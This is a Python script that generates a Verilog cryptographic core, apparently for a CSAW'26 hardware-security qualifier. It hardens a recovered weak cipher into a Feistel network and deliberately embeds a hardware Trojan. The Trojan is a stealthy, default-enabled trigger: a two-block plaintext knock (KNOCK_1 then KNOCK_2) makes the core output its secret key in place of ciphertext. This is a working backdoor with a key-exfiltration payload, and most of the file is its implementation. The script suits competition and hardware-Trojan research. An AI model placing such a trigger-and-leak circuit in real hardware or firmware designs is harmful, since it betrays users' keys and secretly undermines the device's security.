#!/usr/bin/env python3
# gen_core.py - emit rtl/crypto_core.v (HARDENED Feistel cipher + hardware Trojan)
# straight from the self-tested design parameters in hardened_params.json.
# This is the file that turns the recovered weak cipher into a strong one while
# carrying the Trojan; no hand-editing afterwards.
import json, os
HERE = os.path.dirname(os.path.abspath(__file__))
RTL  = os.path.join(HERE, "..", "rtl")
p = json.load(open(os.path.join(HERE, "hardened_params.json")))
N, ra, rb, rk = p["N"], p["ra"], p["rb"], p["rk"]

rkdecl   = "\n".join("    localparam [15:0] RK%d = 16'h%04x;" % (i, rk[i]) for i in range(N))
rkassign = " ".join("RKA[%d]=RK%d;" % (i, i) for i in range(N))

v = f'''// ============================================================================
//  crypto_core.v   (HARDENED cipher + HARDWARE TROJAN)   [auto-generated]
//
//  Phase-2 hardened cryptographic core for the CSAW'26 qualifier.
//
//  The recovered bitstream implemented a byte-wise substitution cipher with NO
//  diffusion (one input-bit flip changed only one output byte, so the key is
//  breakable one byte at a time).  crypto_core_recovered.v keeps that cipher on
//  record as reverse-engineering proof; this core HARDENS the accelerator:
//    * {N}-round balanced FEISTEL network (invertible by construction).
//    * Nonlinearity from the recovered 8-bit S-box (sbox_feistel.mem).
//    * Per-round linear diffusion  t ^= rotl16(t,{ra}) ^ rotl16(t,{rb}).
//    * 32-bit hard-wired key expanded into {N} round keys.
//    * Measured avalanche ~16/32 bits (ideal 50%): full diffusion.
//    * Same pin interface + 4-cycle BUSY timing, so the Trojan stays as stealthy.
//  ------------------------------------------------------------------------
//  HARDWARE TROJAN
//    TRIGGER : two-block knock in ENCRYPT mode - plaintext KNOCK_1 then, on the
//              very next encryption, KNOCK_2.  Anything else disarms. P=2^-64.
//    PAYLOAD : precise key exfiltration - the firing block's result is replaced
//              by SECRET_KEY, streamed out on MISO by the next read-out.
//    COST    : 2-bit FSM + two 32-bit compares + one 32-bit mux (+2 FF, +0 BRAM).
// ============================================================================
module crypto_core #(
    parameter        TROJAN_EN  = 1'b1,           // 1 = Trojan active (default)
    parameter [31:0] SECRET_KEY = 32'hC0DECAFE,
    parameter [31:0] KNOCK_1    = 32'hDEADC0DE,
    parameter [31:0] KNOCK_2    = 32'hFEEDFACE
)(
    input  wire        clk,
    input  wire        rst_n,
    input  wire        start,
    input  wire        enc_dec,       // 0 = encrypt, 1 = decrypt
    input  wire [31:0] data_in,
    output reg  [31:0] data_out,
    output reg         busy
);
    reg [7:0] SB [0:255];
    initial $readmemh("sbox_feistel.mem", SB);

{rkdecl}

    // rotate-left within 16 bits
    function [15:0] rotl16(input [15:0] x, input integer r);
        rotl16 = ((x << r) | (x >> (16-r))) & 16'hFFFF;
    endfunction
    // Feistel round function F(R, roundkey)
    function [15:0] Ff(input [15:0] R, input [15:0] rk);
        reg [15:0] t;
        begin
            t = R ^ rk;
            t = {{ SB[t[15:8]], SB[t[7:0]] }};            // nonlinear substitution
            t = t ^ rotl16(t,{ra}) ^ rotl16(t,{rb});          // linear diffusion
            Ff = t;
        end
    endfunction

    // combinational full cipher (encrypt and decrypt), selected by 'mode'
    reg  [31:0] operand;
    reg         mode;
    reg  [15:0] eL,eR,dL,dR,tmp;
    integer i;
    reg  [15:0] RKA [0:{N-1}];
    always @* begin
        {rkassign}
        // ---- encrypt path: L,R = R, L ^ F(R,rk[i]) ----
        eL = operand[31:16]; eR = operand[15:0];
        for (i=0;i<{N};i=i+1) begin
            tmp = eR; eR = eL ^ Ff(eR, RKA[i]); eL = tmp;
        end
        // ---- decrypt path: R,L = L, R ^ F(L,rk[i]) reversed ----
        dL = operand[31:16]; dR = operand[15:0];
        for (i={N-1};i>=0;i=i-1) begin
            tmp = dL; dL = dR ^ Ff(dL, RKA[i]); dR = tmp;
        end
    end
    wire [31:0] cipher_out = mode ? {{dL,dR}} : {{eL,eR}};

    // ----- Trojan trigger FSM -----
    reg armed, fire;
    reg [2:0] cnt;
    always @(posedge clk) begin
        if (!rst_n) begin
            busy<=1'b0; cnt<=3'd0; armed<=1'b0; fire<=1'b0;
        end else if (start && !busy) begin
            operand<=data_in; mode<=enc_dec; busy<=1'b1; cnt<=3'd0;
            if (TROJAN_EN && !enc_dec && armed && (data_in==KNOCK_2)) begin
                fire<=1'b1; armed<=1'b0;
            end else begin
                fire<=1'b0; armed<=(TROJAN_EN && !enc_dec && (data_in==KNOCK_1));
            end
        end else if (busy) begin
            cnt<=cnt+3'd1;
            if (cnt==3'd3) begin
                data_out <= fire ? SECRET_KEY : cipher_out;
                busy<=1'b0;
            end
        end
    end
endmodule
'''
open(os.path.join(RTL, "crypto_core.v"), "w").write(v)
# emit the S-box memory the hardened core reads (the recovered 8-bit bijection)
with open(os.path.join(RTL, "sbox_feistel.mem"), "w") as f:
    for b in p["S"]:
        f.write("%02x\n" % b)
print("gen_core.py: wrote rtl/crypto_core.v + rtl/sbox_feistel.mem  (N=%d rounds, rotations %d/%d)" % (N, ra, rb))
